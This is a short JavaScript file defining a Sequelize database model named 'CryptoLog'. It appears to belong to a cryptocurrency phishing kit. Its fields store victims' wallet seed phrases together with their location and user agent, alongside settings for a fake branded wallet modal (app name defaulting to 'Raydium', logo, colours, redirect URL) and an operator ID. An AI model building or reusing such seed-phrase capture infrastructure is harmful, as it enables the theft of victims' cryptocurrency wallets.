import { DataTypes } from 'sequelize';
import sequelize from '../sequelize.js';

const CryptoLogs = sequelize.define('CryptoLog', {
  app_name: {
    type: DataTypes.STRING,
    defaultValue: "Raydium",
  },
  appLogo: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  seed_phrase: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  modalColor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  redirectUrl: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  backgroundcolor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  btnColor: {
    type: DataTypes.STRING,
    defaultValue: '',
  },
  location: {
    type: DataTypes.JSON, 
  },
  useragent: {
    type: DataTypes.JSON, 
  },
  userId: {
    type: DataTypes.INTEGER,
    allowNull: false, 
  },
  datetime: {
    type: DataTypes.DATE,
    defaultValue: DataTypes.NOW, // Automatically sets to current date/time
  },
}, {
  timestamps: true,
});

export default CryptoLogs;
